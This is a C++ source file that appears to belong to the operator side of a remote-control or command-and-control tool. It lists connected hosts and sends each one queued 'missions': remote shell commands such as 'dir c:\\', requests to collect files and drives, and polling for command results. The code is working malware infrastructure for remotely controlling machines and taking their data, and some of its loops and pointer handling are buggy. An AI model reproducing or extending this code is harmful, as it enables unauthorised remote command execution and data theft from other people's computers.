
#include "mission.h"

#include "FileHelper.h"

#include <windows.h>

#include "http.h"
#include "https.h"
#include "public.h"
#include "packet.h"

#include "command.h"

#include <vector>

using namespace std;


char* buildCmd(CONST char* data, int datalen, int type) {
	char* buf = new char[datalen + sizeof(MY_CMD_PACKET) + 16];
	MY_CMD_PACKET* mypack = (MY_CMD_PACKET*)buf;
	mypack->len = datalen;
	mypack->type = type;
	if (data && datalen)
	{
		memcpy(mypack->value, data, datalen);
	}
	
	return buf;
}


char* buildCmd2(CONST char* data1, int datalen1, int type1, const char * data2,int datalen2, int type2) {
	char* buf = new char[datalen1 + sizeof(MY_CMD_PACKET) + datalen2 + sizeof(MY_CMD_PACKET) + 16];
	MY_CMD_PACKET* mypack = (MY_CMD_PACKET*)buf;
	mypack->len = datalen1;
	mypack->type = type1;
	if (data1 && datalen1)
	{
		memcpy(mypack->value, data1, datalen1);
	}
	mypack = (MY_CMD_PACKET*)(buf + datalen1 + sizeof(MY_CMD_PACKET));
	mypack->len = datalen2;
	mypack->type = type2;
	if (data2 && datalen2)
	{
		memcpy(mypack->value, data2, datalen2);
	}
	return buf;
}


DataMission::DataMission(int type) {
	InitializeCriticalSection(&m_cs);

	if (type == MISSION_TYPE_FILE)
	{
		m_mfn = FILEMISSION_FILENAME;
		m_cmd = CMD_SEND_DD_DATA;
	}
	else if (type == MISSION_TYPE_CMD)
	{
		m_mfn = CMDMISSION_FILENAME;

		m_cmd = CMD_SEND_CMD;
	}
	else {

	}

	int ret = 0;
	char* data = 0;
	int filesize = 0;
	ret = FileHelper::fileReader(m_mfn.c_str(), &data, &filesize);
	if (ret)
	{
		MISSION_ITEM* items = (MISSION_ITEM*)data;

		int items_cnt = filesize / MISSION_ETEM_SIZE;

		for (int i = 0; i < items_cnt; i++)
		{
			m_missions.push_back(items[i]);
		}
	}
}


DataMission::DataMission() {
	InitializeCriticalSection(&m_cs);
	
	int ret = 0;
	char* data = 0;
	int filesize = 0;
	ret = FileHelper::fileReader(FILEMISSION_FILENAME, &data, &filesize);
	if (ret)
	{
		MISSION_ITEM* items = (MISSION_ITEM*)data;

		int items_cnt = filesize / MISSION_ETEM_SIZE;

		for (int i = 0; i < items_cnt; i++)
		{
			m_missions.push_back(items[i]);
		}
	}

}

DataMission::~DataMission() {

	DeleteCriticalSection(&m_cs);

}

int DataMission::keepFileMission(string key,string value,int type) {

	int ret = 0;

	MISSION_ITEM item;
	item.type = MISSION_TYPE_FILE;
	memcpy(item.key, key.c_str(),sizeof(item.key));
	lstrcpyA(item.value, value.c_str());
	EnterCriticalSection(&m_cs);
	m_missions.push_back(item);
	LeaveCriticalSection(&m_cs);

// 	MISSION_ITEM item;
// 	item.type = type;
// 	lstrcpyA(item.key, key.c_str());
// 	lstrcpyA(item.value, value.c_str());
// 	ret = FileHelper::fileWriter(MISSION_FILE_NAME, (char*)&item, MISSION_ETEM_SIZE, FALSE);

	return ret;
}




int DataMission::getFileMission_test() {

	int ret = 0;

	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		vector<CLIENT_INFO>hosts = parseHosts(data + 4, datasize - 8);
		int hosts_cnt = hosts.size();
		for (int n = 0; n < hosts_cnt; n++)
		{
			int items_cnt = m_missions.size();

			for (int i = 0; i < items_cnt; i++)
			{
				if (m_missions[n].type && hosts[n].host == string(m_missions[n].key))
				{
					lstrcpyA(g_uuid, hosts[n].host.c_str());

					string filename = string(m_missions[n].value);

					int backsize = MAX_SIZE;

					
					char packbuf[1024];
					MY_CMD_PACKET *mypack = (MY_CMD_PACKET *)packbuf;
					mypack->len = filename.size();
					mypack->type = MISSION_TYPE_FILE;
					lstrcpyA(mypack->value, filename.c_str());

					ret = packet.postCmdFile(CMD_SEND_DD_DATA,(const char*)&mypack,sizeof(MY_CMD_PACKET) + filename.size());

					int try_cnt = 6;
					while (try_cnt)
					{
						Sleep(1000);

						ret = packet.postCmd(CMD_QUERY_OPERATOR,0,0);
						if (ret == 0 || *(DWORD*)(data) == INVALID_RESPONSE)
						{

						}
						else {
							m_missions.erase(m_missions.begin() + n);
							break;
						}

						try_cnt--;
					}
				}
			}
		}

		int items_cnt = m_missions.size();
		MISSION_ITEM* item_ptr = new MISSION_ITEM[items_cnt];
		int num = 0;
		for (int i = 0; i < items_cnt; i++)
		{
			if (m_missions[i].key)
			{
				item_ptr[i] = m_missions[i];
			}
		}

		ret = FileHelper::fileWriter(FILEMISSION_FILENAME, (char*)item_ptr, items_cnt * sizeof(MISSION_ITEM), TRUE);

	}	

	return TRUE;
}



int DataMission::getFileMission() {

	int ret = 0;

	PacketParcel packet(TRUE);
	
	char backdata[MAX_SIZE];
	int backsize = MAX_SIZE;
	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	vector<CLIENT_INFO>hosts = parseHosts(backdata, backsize);
	int hosts_cnt = hosts.size();
	for (int n = 0; n < hosts_cnt; n++)
	{
		lstrcpyA(g_uuid, hosts[n].host.c_str());

		ret = packet.postCmd(CMD_GET_DRIVER, 0,0);

		int backsize = MAX_SIZE;

		char * buf = buildCmd("C:\\", 3, MISSION_TYPE_FILE);

		ret = packet.postCmdFile(CMD_SEND_DD_DATA, buf,3+sizeof(MY_CMD_PACKET));


		int try_cnt = 6;
		while (try_cnt)
		{
			Sleep(1000);

			ret = packet.postCmd(CMD_QUERY_OPERATOR, 0, 0);
			if (ret == 0 || *(DWORD*)(backdata) == INVALID_RESPONSE)
			{

			}
			else {

				break;
			}

			try_cnt--;
		}
	}

	return TRUE;
}


int DataMission::updateMission() {

	return 0;
}

int DataMission::removeFileMission(string key) {
	int ret = 0;
	int num = 0;
	EnterCriticalSection(&m_cs);
	int item_cnt = m_missions.size();
	for (int i = 0;i < item_cnt;i ++)
	{
		if ( memcmp(m_missions[i].key,key.c_str(), UUID_LENGTH) == 0)
		{
			m_missions.erase(m_missions.begin() + i);
			num++;
		}
	}
	LeaveCriticalSection(&m_cs);
	return num;

	/*
	char* data = 0;
	int filesize = 0;

	ret = FileHelper::fileReader(MISSION_FILE_NAME, &data, &filesize);
	if (ret)
	{
		MISSION_ITEM* items = (MISSION_ITEM*)data;
		int items_cnt = filesize / MISSION_ETEM_SIZE;

		MISSION_ITEM* item_ptr = items;
		int num = 0;
		for (int i = 0; i < items_cnt; i++)
		{
			if (item_ptr->key == 0)
			{
				int pos = ((char*)item_ptr - data);
				int leastsize = filesize - pos;

				char* nextitem = (char*)(item_ptr + 1);
				memcpy((char*)item_ptr, nextitem, leastsize);
				filesize -= MISSION_ETEM_SIZE;

				num++;
			}
			else {
				item_ptr++;
			}
		}

		if (num)
		{
			ret = FileHelper::fileWriter(MISSION_FILE_NAME, data, filesize,TRUE);
		}
	}
	*/
}



int DataMission::getCmdMission_test() {
	int ret = 0;

	PacketParcel packet(TRUE);
	//HttpProto http(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		vector<CLIENT_INFO>hosts = parseHosts(data + 4, datasize -8);
		int hosts_cnt = hosts.size();
		for (int n = 0; n < hosts_cnt; n++)
		{
			int items_cnt = m_missions.size();

			for (int i = 0; i < items_cnt; i++)
			{
				if (m_missions[n].type && hosts[n].host == string(m_missions[n].key))
				{
					lstrcpyA(g_uuid, hosts[n].host.c_str());

					string filename = string(m_missions[n].value);

					int backsize = MAX_SIZE;
					ret = packet.postCmd(CMD_SEND_CMD, (char*)filename.c_str(),filename.size());

					int try_cnt = 6;
					while (try_cnt)
					{
						Sleep(1000);

						ret = packet.postCmd(CMD_QUERY_OPERATOR, 0, 0);
						if (ret == 0 || *(DWORD*)(data) == INVALID_RESPONSE)
						{

						}
						else {
							m_missions.erase(m_missions.begin() + n);
							break;
						}

						try_cnt--;
					}
				}
			}
		}

		int items_cnt = m_missions.size();
		MISSION_ITEM* item_ptr = new MISSION_ITEM[items_cnt];
		int num = 0;
		for (int i = 0; i < items_cnt; i++)
		{
			if (m_missions[i].key)
			{
				item_ptr[i] = m_missions[i];
			}
		}

		ret = FileHelper::fileWriter(FILEMISSION_FILENAME, (char*)item_ptr, items_cnt * sizeof(MISSION_ITEM), TRUE);

	}

	return TRUE;
}


int DataMission::getCmdMission() {
	int ret = 0;

	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();

		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);
		int hosts_cnt = hosts.size();
		for (int n = 0; n < hosts_cnt; n++)
		{	
			lstrcpyA(g_uuid, hosts[n].host.c_str());

			char * buffer = buildCmd("dir c:\\", 8, MISSION_TYPE_CMD);

			int backsize = MAX_SIZE;
			ret = packet.postCmd(CMD_SEND_CMD, (char*)buffer, 8+sizeof(MY_CMD_PACKET));

			int try_cnt = 6;
			while (try_cnt)
			{
				Sleep(1000);

				ret = packet.postCmd(CMD_GET_CMD_RESULT, 0, 0);
				if (ret == 0 || *(DWORD*)(data) == INVALID_RESPONSE)
				{
					IN_PACKET_HEADER* pack = (IN_PACKET_HEADER*)data;

					MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(data + sizeof(IN_PACKET_HEADER));

				}
				else {
					break;
				}

				try_cnt--;
			}
		}

	}

	return TRUE;
}


int DataMission::keepCmdMission(string key,string value,int type) {
	int ret = 0;

	MISSION_ITEM item;
	item.type = MISSION_TYPE_FILE;
	memcpy(item.key, key.c_str(), sizeof(item.key));
	lstrcpyA(item.value, value.c_str());
	EnterCriticalSection(&m_cs);
	m_missions.push_back(item);
	LeaveCriticalSection(&m_cs);

	// 	MISSION_ITEM item;
	// 	item.type = type;
	// 	lstrcpyA(item.key, key.c_str());
	// 	lstrcpyA(item.value, value.c_str());
	// 	ret = FileHelper::fileWriter(MISSION_FILE_NAME, (char*)&item, MISSION_ETEM_SIZE, FALSE);

	return ret;
}


int DataMission::removeCmdMission(string key) {
	int ret = 0;
	int num = 0;
	EnterCriticalSection(&m_cs);
	int item_cnt = m_missions.size();
	for (int i = 0; i < item_cnt; i++)
	{
		if (memcmp(m_missions[i].key, key.c_str(), UUID_LENGTH) == 0)
		{
			m_missions.erase(m_missions.begin() + i);
			num++;
		}
	}
	LeaveCriticalSection(&m_cs);
	return num;
}